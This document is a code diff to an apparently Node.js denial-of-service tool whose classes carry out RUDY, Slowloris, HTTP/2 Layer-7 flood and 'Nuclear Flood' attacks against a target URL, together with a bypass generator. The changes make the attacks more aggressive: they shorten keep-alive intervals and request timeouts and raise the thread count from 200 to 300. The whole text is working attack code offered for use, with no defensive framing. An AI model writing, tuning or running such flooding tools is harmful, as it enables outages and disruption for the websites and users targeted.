@@ -182,7 +182,7 @@ class RudyAttack {
         };
 
         const scheduleNextByte = () => {
-            const randomInterval = 7000 + Math.random() * 3000; // More aggressive keep-alive
+            const randomInterval = 6000 + Math.random() * 2000; // Even more aggressive keep-alive
             timeoutId = setTimeout(() => {
                 sendSlowByte();
                 scheduleNextByte();
@@ -267,7 +267,7 @@ class SlowlorisAttack {
                 this.stats.failed++;
                 clearInterval(intervalId);
             }
-        }, 8000 + Math.random() * 4000); // More aggressive keep-alive
+        }, 7000 + Math.random() * 3000); // Even more aggressive keep-alive
 
         return { req, intervalId };
     }
@@ -314,7 +314,7 @@ class L7Flood {
             method: method,
             headers: headers,
             http2: true,
-            timeout: { request: 4000 }, // Aggressive timeout
+            timeout: { request: 3000 }, // More Aggressive timeout
             retry: { limit: 0 },
             throwHttpErrors: false,
         };
@@ -372,7 +372,7 @@ class NuclearFlood extends L7Flood {
             headers: headers,
             body: requestBody,
             http2: true,
-            timeout: { request: 4000 }, // Aggressive timeout
+            timeout: { request: 3000 }, // More Aggressive timeout
             retry: { limit: 0 },
             throwHttpErrors: false,
         };
@@ -387,7 +387,7 @@ class NuclearFlood extends L7Flood {
 }
 
 process.on('message', ({ targetUrl, duration }) => {
-    const threads = 200;
+    const threads = 300;
     const l7Delay = 100;
     const allAttackModes = ['RUDY', 'L7 Flood', 'Slowloris', 'Nuclear Flood'];
 
@@ -398,6 +398,7 @@ process.on('message', ({ targetUrl, duration }) => {
     }
 
     const bypasser = new BypassGenerator();
+    const stats = { total: 0, success: 0, failed: 0, phase: 'Initializing...' };
 
     // Kirim statistik ke proses induk setiap detik
     setInterval(() => {
@@ -413,7 +414,6 @@ process.on('message', ({ targetUrl, duration }) => {
         }
     }, 1000);
 
-    const stats = { total: 0, success: 0, failed: 0, phase: 'Initializing...' };
     const totalDurationMs = duration * 1000;
     const phaseDurationMs = totalDurationMs / allAttackModes.length;
     let currentAttacker = null;
